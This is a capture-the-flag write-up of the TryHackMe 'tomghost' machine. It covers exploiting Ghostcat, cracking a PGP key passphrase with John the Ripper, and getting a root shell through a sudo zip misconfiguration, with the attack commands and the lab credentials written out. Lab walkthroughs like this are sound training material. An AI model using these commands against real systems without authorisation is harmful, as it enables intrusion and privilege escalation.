# 🕵️ CTF Writeup: tomghost (TryHackMe)

This report details the systematic exploitation of the "tomghost" machine, covering entry via Ghostcat, PGP decryption, and privilege escalation.

---

## 🛠️ Step 1: Reconnaissance
[Logic] Identify the attack surface by scanning for exposed services and mapping them to known vulnerabilities.

* Action: Conducted high-speed port scanning with rustscan and searched the exploit database with searchsploit.
* Discovery: Port 8009/AJP was found open. Cross-referencing this with the Tomcat version led to the identification of the Ghostcat (CVE-2020-1938) vulnerability.
* Commands:
  $ rustscan -a <Target_IP> -- -sV
  $ searchsploit tomcat ajp

---

## 🐱 Step 2: Exploitation (Ghostcat)
[Logic] Leverage the AJP protocol flaw to bypass security restrictions and read internal server files.

* Action: Exploited the Ghostcat vulnerability using a Python script.
* Correction: The script required manual modification to run on Python 3, specifically handling bytes objects and adding .decode('utf-8') to the data stream.
* Commands:
  $ python3 48143.py <Target_IP>
* Result: Discovered credentials for the user "skyfuck".
  - User: skyfuck
  - Pass: 8730281lkjlkjdqlksalks

---

## 🔑 Step 3: Internal Enumeration
[Logic] After gaining initial access, assess local permissions and search for artifacts belonging to other users.

* Action: Checked sudo privileges and searched the home directory.
* Discovery: Running "sudo -l" for skyfuck returned no permissions. However, two critical PGP-related files were found: "tryhackme.asc" (Private Key) and "credential.pgp" (Encrypted Data).

---

## 🔨 Step 4: Lateral Movement (PGP Decryption)
[Logic] Use offline brute-forcing to bypass secondary encryption on the stolen private key.

* Action: Cracked the PGP passphrase using John the Ripper and decrypted the credential file.
* Commands:
  # Extract hash from the private key
  $ gpg2john tryhackme.asc > hash_to_crack

  # Brute-force passphrase using rockyou.txt
  $ john --wordlist=/usr/share/wordlists/rockyou.txt hash_to_crack
  # Result -> alexandru

  # Decrypt the credentials
  $ gpg --import tryhackme.asc
  $ gpg --decrypt credential.pgp
* Captured Password for merlin:
  asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
* Execution: Switched to the new user via "su merlin".

---

## ⚡ Step 5: Privilege Escalation to Root
[Logic] Identify and exploit misconfigured binaries with the SUID bit or NOPASSWD sudo rights.

* Action: Exploited a sudoers misconfiguration for the zip binary.
* Discovery: merlin was permitted to run /usr/bin/zip as root without a password.
* Exploitation: Utilized the zip "test" flag (-T) and "unzip command" flag (-TT) to execute a root shell.
* Commands:
  $ sudo -l
  # Output: (root : root) NOPASSWD: /usr/bin/zip

  # Execute Root Shell
  $ sudo zip /tmp/pwn.zip /etc/hosts -T -TT '/bin/sh #'

---

## 🚩 Final Objectives
* User Flag: Located in /home/merlin/user.txt
* Root Flag: Located in /root/root.txt
